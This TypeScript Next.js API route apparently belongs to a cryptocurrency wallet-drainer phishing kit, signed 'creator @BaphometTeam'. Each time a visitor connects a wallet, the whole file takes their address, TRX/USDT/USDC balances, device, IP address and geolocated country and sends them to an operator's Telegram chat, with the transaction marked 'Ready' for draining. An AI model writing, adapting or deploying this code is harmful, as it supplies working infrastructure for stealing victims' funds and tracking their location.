import { NextRequest, NextResponse } from 'next/server'

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

interface NotifyRequest {
  address: string
  balances: {
    trx: number
    usdt: number
    usdc: number
  }
  values: {
    total: number
  }
  walletType: string
  device: string
}

function getFlagEmoji(countryCode: string): string {
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0))
  return String.fromCodePoint(...codePoints)
}

export async function POST(request: NextRequest) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return NextResponse.json(
      { error: 'Telegram credentials not configured' },
      { status: 500 }
    )
  }

  try {
    const body: NotifyRequest = await request.json()

    const clientIp = 
      request.headers.get('x-forwarded-for')?.split(',')[0] ||
      request.headers.get('x-real-ip') ||
      request.headers.get('cf-connecting-ip') ||
      'Unknown'

    let ipInfo = {
      ip: clientIp,
      country: 'Unknown',
      countryCode: 'XX'
    }

    if (clientIp !== 'Unknown') {
      try {
        const geoResponse = await fetch(`https://ipapi.co/${clientIp}/json/`)
        const geoData = await geoResponse.json()
        
        if (geoData && !geoData.error) {
          ipInfo.country = geoData.country_name || 'Unknown'
          ipInfo.countryCode = geoData.country_code || 'XX'
        }
      } catch {}

      // Fallback to ip-api.com if ipapi.co failed
      if (ipInfo.country === 'Unknown') {
        try {
          const fallbackResponse = await fetch(`http://ip-api.com/json/${clientIp}`)
          const fallbackData = await fallbackResponse.json()
          
          if (fallbackData && fallbackData.status === 'success') {
            ipInfo.country = fallbackData.country || 'Unknown'
            ipInfo.countryCode = fallbackData.countryCode || 'XX'
          }
        } catch {}
      }
    }

    const userAgent = request.headers.get('user-agent') || 'Unknown'
    
    let device = body.device
    if (!device || device === 'Unknown') {
      if (userAgent.includes('Mobile') || userAgent.includes('iPhone') || userAgent.includes('Android')) {
        device = 'Mobile'
      } else if (userAgent.includes('iPad') || userAgent.includes('Tablet')) {
        device = 'Tablet'
      } else {
        device = 'Desktop'
      }
    }

    const domain = request.headers.get('host') || 'unknown'
    const flag = getFlagEmoji(ipInfo.countryCode)

    let assetsText = ''
    if (body.balances.usdt > 0) {
      assetsText += `   USDT: ${body.balances.usdt.toFixed(4)} (~$${(body.balances.usdt * 1.0).toFixed(2)})\n`
    }
    if (body.balances.usdc > 0) {
      assetsText += `   USDC: ${body.balances.usdc.toFixed(4)} (~$${(body.balances.usdc * 1.0).toFixed(2)})\n`
    }
    if (!assetsText) {
      assetsText = '   No tokens found'
    }

    const trxValue = body.values.total - (body.balances.usdt + body.balances.usdc)

    const message = `New Connect 🍯
${body.address}
- 🪓 Wallet: ${body.walletType} (Connected)
- ⚙️ Device: ${device}
IP: ${ipInfo.ip} ${flag}
Country: ${ipInfo.country}
Domain: ${domain}
💶 Total portfolio value: ~$${body.values.total.toFixed(2)} USD
   - TRX: ${body.balances.trx.toFixed(4)} TRX (~$${trxValue.toFixed(2)})
   - Tokens: ~$${(body.balances.usdt + body.balances.usdc).toFixed(2)} USD
🎖 Assets:
${assetsText}⚜️ Transaction: Ready
👹 #connect #request #TRX
creator @BaphometTeam`

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }
    )

    const telegramData = await telegramResponse.json()

    if (telegramData.ok) {
      return NextResponse.json({ success: true })
    } else {
      return NextResponse.json(
        { error: 'Telegram API error', details: telegramData },
        { status: 500 }
      )
    }
  } catch {
    return NextResponse.json(
      { error: 'Failed to send notification' },
      { status: 500 }
    )
  }
}
